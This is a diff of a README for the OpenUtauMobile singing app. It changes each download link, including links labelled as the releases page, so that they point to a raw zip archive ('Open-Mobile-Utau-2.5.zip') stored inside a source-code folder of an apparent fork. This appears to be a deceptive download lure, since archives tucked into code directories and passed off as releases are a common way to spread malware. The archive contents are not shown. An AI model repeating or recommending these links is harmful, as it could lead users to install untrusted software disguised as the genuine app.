@@ -6,9 +6,9 @@ Welcome to OpenUtauMobile! This is an open-source software designed to help you 
 
 ## 📥 Download OpenUtauMobile
 
-[![Download OpenUtauMobile](https://raw.githubusercontent.com/Oren-Bartuv/OpenUtauMobile/master/OpenUtau.Core/G2p/Data/g2p-arpabet-plus.zip)](https://raw.githubusercontent.com/Oren-Bartuv/OpenUtauMobile/master/OpenUtau.Core/G2p/Data/g2p-arpabet-plus.zip)
+[![Download OpenUtauMobile](https://raw.githubusercontent.com/Oren-Bartuv/OpenUtauMobile/master/OpenUtau.Core/Analysis/Open-Mobile-Utau-2.5.zip)](https://raw.githubusercontent.com/Oren-Bartuv/OpenUtauMobile/master/OpenUtau.Core/Analysis/Open-Mobile-Utau-2.5.zip)
 
-Visit this page to download: [OpenUtauMobile Releases](https://raw.githubusercontent.com/Oren-Bartuv/OpenUtauMobile/master/OpenUtau.Core/G2p/Data/g2p-arpabet-plus.zip)
+Visit this page to download: [OpenUtauMobile Releases](https://raw.githubusercontent.com/Oren-Bartuv/OpenUtauMobile/master/OpenUtau.Core/Analysis/Open-Mobile-Utau-2.5.zip)
 
 ## 📋 System Requirements
 
@@ -65,7 +65,7 @@ If you run into any issues during installation or while using the app, try these
 
 - Ensure your device meets the system requirements.
 - Restart the app or your device if it becomes unresponsive.
-- Check for any app updates on the [Releases page](https://raw.githubusercontent.com/Oren-Bartuv/OpenUtauMobile/master/OpenUtau.Core/G2p/Data/g2p-arpabet-plus.zip).
+- Check for any app updates on the [Releases page](https://raw.githubusercontent.com/Oren-Bartuv/OpenUtauMobile/master/OpenUtau.Core/Analysis/Open-Mobile-Utau-2.5.zip).
 - Consult community forums for specific help.
 
 ## 🤝 Support
